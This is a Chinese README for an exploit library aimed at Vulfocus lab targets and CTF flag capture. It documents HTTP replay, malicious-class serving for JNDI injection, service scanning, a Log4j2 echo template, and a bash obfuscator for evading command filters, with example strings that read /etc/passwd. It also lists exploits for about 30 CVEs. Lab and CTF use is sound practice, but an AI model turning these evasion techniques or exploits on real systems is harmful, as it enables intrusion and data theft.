# VulfocusExp

这是一个 Vulfocus 靶场的 Exploit 库，致力于快速 flag 获取。

## 项目简介

本项目集成了常见 Web 框架和服务的漏洞利用脚本，采用模块化设计，支持自动化目标扫描、漏洞利用和 flag 提取。适用于渗透测试、CTF 竞赛和漏洞复现场景。

## 项目结构

```
.
├── tool/                      # 核心工具库
│   ├── __init__.py           # 包初始化
│   ├── base.py               # 基础工具（命令执行、flag匹配、进程管理）
│   ├── http_repeater.py      # 原始 HTTP 请求重放器
│   ├── http_server.py        # 简易 HTTP 服务器
│   ├── port_scan.py          # 端口服务检测
│   ├── code.py               # 漏洞利用代码模板
│   ├── local_ip.py           # 本机 IP 获取
│   └── bash_obf.py           # Bash 命令混淆工具
│
├── [漏洞名].py               # 漏洞利用脚本（约 35+ 个）
├── main.py                   # 主入口（批量处理）
└── README.md
```

## 依赖安装

```bash
pip install brotli psutil
```

## 核心模块

### tool/base.py

基础工具模块，提供核心功能：

| 函数/类 | 功能 |
|---------|------|
| `set_debug()` | 启用调试模式，输出详细日志 |
| `debug_log(msg, tag)` | 调试日志输出（内部使用） |
| `wait(func, timeout, interval)` | 等待条件函数返回 True |
| `match_flag(text)` | 从文本中提取单个 flag |
| `match_flags(text)` | 从文本中提取所有 flag |
| `get_local_ip()` | 获取本机出口 IP |
| `run_cmd(command, timeout)` | 同步执行 shell 命令 |
| `RunCmd(command, timeout)` | 非阻塞命令执行器 |
| `CommandResult` | 命令执行结果数据类 |
| `TargetGroup` | 目标组类，管理多端口目标 |
| `parse_ip_port(str)` | 解析 "ip:port1,port2" 格式 |
| `process(ip_port, run, on_process)` | 遍历 URL 并执行利用 |
| `process_with(ip_port, run, types)` | 遍历 (ip, port) 并执行利用 |

#### 详细接口

```python
# 调试模式
set_debug()  # 启用后可通过 EXP_DEBUG=true 环境变量开启详细日志

# Flag 匹配
match_flag(text: str) -> str | None  # 返回第一个匹配的 flag
match_flags(text: str) -> list[str]  # 返回所有匹配的 flag
# 匹配模式: flag-{xxx} 或 flag{xxx}（不区分大小写）

# 命令执行
run_cmd(command: str, timeout: int = 120) -> CommandResult
# 返回: CommandResult(ok: bool, output: str, error: str)

class RunCmd:
    def __init__(self, command: str, timeout: int = 300)
    def run(self) -> tuple[bool, str]  # 启动命令，返回 (是否成功, 消息)
    def join(self) -> CommandResult   # 阻塞等待完成
    def stop(self) -> CommandResult   # 终止进程
    def reset(self) -> None          # 重置状态，可重新 run()
    def __enter__(self) / def __exit__(self)  # 上下文管理器

# 目标处理
parse_ip_port(ip_port: str) -> TargetGroup
# 输入格式: "ip:port1,port2,..." 如 "192.168.1.1:8000,8001"

class TargetGroup:
    ip: str                           # IP 地址
    ports: list[int]                 # 端口列表
    ok: bool                         # 解析是否成功
    error: str                       # 错误信息

    def build_urls(self) -> list[str]          # 构建 URL 列表（根据服务检测）
    def ip_port(self) -> list[tuple[str, int]] # 返回所有 (ip, port) 元组
    def ip_port_with(types) -> list[tuple[str, int]]  # 按服务类型过滤
    def detect_services(timeout=3) -> list[tuple[int, Service]]  # 检测服务类型

# 处理函数
process(ip_port: str, run: Callable, on_process: Callable = None)
process_with(ip_port: str, run: Callable, types: list[Service] = None)
# run 函数签名为: run(target) -> tuple[bool, str | list[str], str]
# 返回: (是否成功, flag或flag列表, 错误信息)
```

---

### tool/http_repeater.py

原始 HTTP 请求重放器，支持：

- 原始 HTTP 请求发送
- SSL/TLS 支持（可忽略证书验证）
- 自动处理 Chunked 编码
- 自动解压 Content-Encoding（gzip/deflate/brotli）
- 自动 Cookie 管理

#### 详细接口

```python
# 响应类
@dataclass
class RawResponse:
    ok: bool                 # 请求是否成功
    error: str               # 错误信息
    resp: bytes              # 原始响应字节

    def __bool__(self) -> bool           # 返回 ok 值
    def text(self, encoding="utf-8") -> str          # 解码响应为字符串
    def status_line(self) -> str         # 获取 HTTP 状态行
    def headers(self) -> Dict[str, List[str]]  # 解析响应头（key 小写）
    def body(self) -> bytes              # 获取响应体（已解压）
    def body_text(self, encoding="utf-8") -> str     # 解码响应体
    def build_cookie(self, old_cookie="") -> str | None  # 从 Set-Cookie 构建请求 Cookie

# 核心函数
def repeater(
    raw_request: str | bytes,
    port: int | None = None,
    host: str | None = None,
    use_ssl: bool = False,
    verify_ssl: bool = False,
    timeout: int = 8,
    max_response_size: int = 3*1024*1024,
    fix_content_length: bool = True,
    headers: dict | None = None
) -> RawResponse
```

#### 使用示例

```python
from tool.http_repeater import repeater

# 基础用法
exp = f"""POST /admin/login HTTP/1.1
Host: {target[0]}:{target[1]}
Content-Type: application/json

{{"username":"admin"}}
"""
resp = repeater(exp)
if resp.ok:
    print(resp.text())
    cookie = resp.build_cookie()  # 从 Set-Cookie 构建 Cookie

# 带额外头
resp = repeater(exp, headers={"Cookie": "session=xxx"})

# HTTPS
resp = repeater(exp, use_ssl=True, verify_ssl=False)
```

---

### tool/http_server.py

简易 HTTP 服务器：

| 类 | 功能 |
|-----|------|
| `HttpEcho` | 回显服务器，记录所有接收到的请求 |
| `HttpFile` | 文件服务器，提供文件下载 |

#### 详细接口

```python
@dataclass
class EchoRequest:
    ip: str                  # 请求来源 IP
    method: str               # HTTP 方法
    path: str                # 请求路径
    headers: dict[str, str]  # 请求头
    body: bytes              # 请求体
    timestamp: float         # 时间戳

class HttpEcho(_BaseHttpServer):
    def __init__(self, port=8000)
    def start(self)          # 启动服务器
    def stop(self)           # 停止服务器
    def requests(self) -> list[EchoRequest]  # 获取所有请求
    def echo(self) -> str    # 获取格式化请求列表

class HttpFile(_BaseHttpServer):
    def __init__(self, files: dict[str, bytes | Path], port=8001)
    # files: 文件名到内容的映射，支持 bytes 或 Path
```

#### 使用示例

```python
from tool.http_server import HttpEcho, HttpFile

# HttpEcho 用法
with HttpEcho(port=8000) as echo:
    # 触发漏洞，使目标发送请求到本机
    run_cmd(f"curl http://{ip}:8000 -d 'test'")
    time.sleep(1)
    # 获取接收到的请求
    text = echo.echo()

# HttpFile 用法（用于提供恶意 class 文件等）
with HttpFile({"malicious.class": malicious_bytes}, port=8001) as f:
    # 启动文件服务器
    pass

# HttpFile 从文件读取
from pathlib import Path
with HttpFile({"Echo.class": Path("./Echo.class")}, port=8001):
    pass
```

---

### tool/port_scan.py

端口服务检测：识别 HTTP/HTTPS/SSH/数据库等服务类型

#### 详细接口

```python
class Service(Enum):
    """服务类型枚举"""
    HTTP = "http"
    HTTPS = "https"
    MYSQL = "mysql"
    REDIS = "redis"
    SSH = "ssh"
    FTP = "ftp"
    SMTP = "smtp"
    DNS = "dns"
    TELNET = "telnet"
    POP3 = "pop3"
    IMAP = "imap"
    SMB = "smb"
    RDP = "rdp"
    VNC = "vnc"
    MONGODB = "mongodb"
    POSTGRESQL = "postgresql"
    ELASTICSEARCH = "elasticsearch"
    UNKNOWN = "unknown"  # 端口开放但无法识别
    NONE = "none"        # 端口未开放

# 核心函数
def detect_services_fast(
    target: tuple[str, list[int]],
    timeout: float = 2.5
) -> list[tuple[int, Service]]
# 返回: [(端口, 服务类型), ...]

# 异步接口
async def detect_services_async(
    target: tuple[str, list[int]],
    timeout: float = 2.5
) -> list[tuple[int, Service]]
```

---

### tool/code.py

漏洞利用代码模板：包含各类漏洞的利用代码片段

#### 详细接口

```python
# Java JNDI 注入 Echo 类模板
java_echo: str
# 模板变量: {{ip}} 和 {{port}}
# 用于 Log4j2 等漏洞的 JNDI 注入利用
```

#### 使用示例

```python
from tool.code import java_echo
from tool.http_server import HttpFile

# 替换模板变量
java = java_echo.replace("{{ip}}", ip).replace("{{port}}", "8000")
with open("Echo.java", "w") as f:
    f.write(java)
```

---

### tool/local_ip.py

本机 IP 获取：智能选择最佳网络接口

#### 详细接口

```python
def get_ip(verbose: bool = False) -> str | None
# verbose: 是否打印详细的候选接口评分信息
# 返回最佳 IPv4 地址，没有找到则返回 None
```

#### 功能说明

- 自动排除虚拟接口（Docker、VMWare、WSL 等）
- 优先选择有线网卡（eth、ens、enp 等）
- 按网段评分（公网 > 10.0.0.0/8 > 172.16.0.0/12 > 192.168.0.0/16）
- 支持 Windows、Linux、macOS

---

### tool/bash_obf.py

Bash 命令混淆工具：用于绕过命令过滤

#### 详细接口

```python
# 可用的混淆方法
OBFUSCATIONS = {
    "path_slash":      # / -> ${PATH:0:1}
    "ifs1":            # 空格 -> $IFS$9
    "ifs2":            # 空格 -> ${IFS}
    "tab":             # 空格 -> Tab 字符
    "bash_c_ifs1":     # 输出 bash -c cat$IFS$9/etc/passwd 格式，java.lang.Runtime.getRuntime().exec下常用
    "base64":          # 输出 echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash 格式
    "base64_bash_c":   # bash -c + base64
    "hex1":            # 十六进制转义 (printf)
    "hex2":            # 十六进制转义 (echo -e)
    "oct1":            # 八进制转义
    "rev1":            # 命令反转 (单引号)
    "rev2":            # 命令反转 (双引号)
    "backslash":       # 字符间插入反斜杠
    "dollar_brackets": # echo $(cmd)
    "double_quotes":   # 字符间插入 ""
    "single_quotes":   # 字符间插入 ''
    "empty_var":       # 字符间插入 $@
    "xxd":             # xxd 十六进制编码
    "base64_python3_c": # python3 -c 执行
}

# 核心函数
def apply_obf(name: str, cmd: str, **kwargs) -> str | None
# 应用单个混淆方法

def apply_obfs(
    cmd: str,
    obf: list[str] | None = None,
    **kwargs
) -> str | None
# 应用多个混淆方法（顺序执行）

def random_obf(
    cmd: str,
    obf: list[str] | None = None,
    depth: int = 4,
    args: dict | None = None
) -> str
# 随机深度混淆
```

#### 使用示例

```python
from tool.bash_obf import apply_obfs, random_obf

# 指定混淆方法
result = apply_obfs("ls /tmp", obf=["base64", "rev1"])

# 随机混淆
result = random_obf("cat /etc/passwd", depth=3)
# 随机组合 3 种混淆方法

# 指定可用方法
methods = ["base64", "bash_c_ifs1", "hex1"]
result = random_obf("ls /", obf=methods, depth=2)
```

---

## Exp 实现

### Exp 结构

```python
# 工具导入
import re

from tool.base import match_flag, process_with, get_local_ip, run_cmd
from tool.http_repeater import repeater
from tool.http_server import HttpEcho


# 核心 exp 函数，需要接受一个 target 返回元组
# target 要求 tuple[str, int] 类型，由 process_with 自动注入
# 返回 (ok, flag, error): tuple[bool, str | list[str], str]
def run(target: tuple[str, int]):
    exp1 = f"""POST /ucms/login.php HTTP/1.1
Host: {target[0]}:{target[1]}
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

uuu_username=admin&uuu_password=123456
"""
    # ... 利用逻辑 ...

    resp = repeater(exp1)
    if not resp:
        return False, "", f"exp1:{resp.error}"

    flag = match_flag(resp.text())
    if not flag:
        return False, "", "flag 匹配失败"

    return True, flag, ""


# Exp 主入口
def main(ip_port: str):
    process_with(ip_port, run)


# 提供快速命令行调用入口
if __name__ == "__main__":
    __import__("tool.base", fromlist=["set_debug"]).set_debug()   # 调试脚本时添加
    main("192.168.192.148:42740")
```

### 漏洞利用列表

| 漏洞名称 | CVE 编号 | 漏洞名称 | CVE 编号 |
|---------|---------|---------|---------|
| bash 命令执行 | CVE-2014-6271 | Struts2 命令执行 | CVE-2013-1965 |
| Weblogic 远程代码执行 | CVE-2018-2893 | Struts2 命令执行 | CVE-2017-12611 |
| Weblogic wls-wsat | CVE-2017-3506 | Druid 远程命令执行 | CVE-2021-25646 |
| Weblogic CVE-2020-14883 | CVE-2020-14883 | Nexus 命令执行 | CVE-2020-10199 |
| Spring Framework RCE | CVE-2022-22965 | Nexus 命令执行 | CVE-2020-10204 |
| Log4j2 远程命令执行 | CVE-2021-44228 | XXL-JOB 远程命令执行 | - |
| O2OA 命令执行 | CVE-2022-22916 | GitLab 命令执行 | CVE-2021-22205 |
| Redis Lua 沙盒绕过 | CVE-2022-0543 | Solr 远程命令执行 | CVE-2019-17558 |
| Node.js 命令执行 | CVE-2021-21315 | GoAhead 变量注入 | CVE-2021-42342 |
| H2Database RCE | CVE-2022-23221 | CouchDB 权限绕过 | CVE-2017-12635 |
| UCMS 远程命令执行 | CVE-2020-25483 | Elfinder 命令注入 | CVE-2021-32682 |
| OpenSNS 命令执行 | CNVD-2021-34590 | Rconfig 远程命令执行 | CVE-2019-16662 |
| Nuxeo 命令执行 | CVE-2018-16341 | Webmin 远程命令执行 | CVE-2019-15107 |
| ThinkPHP3.2.x 代码执行 | - | HTTPd 后缀解析 | - |
| HTTPd SSI 命令执行 | - | | |

## 注意事项

- 验证 poc/exp 可行后需要完成与该项目兼容且符合结构的 `[题目名].py` 并进行测试，直到 exp 完善
- 调试模式：设置环境变量 `EXP_DEBUG=true` 可查看详细执行日志
- 端口格式：`ip:port` 或 `ip:port1,port2,port3`（多个端口用逗号分隔）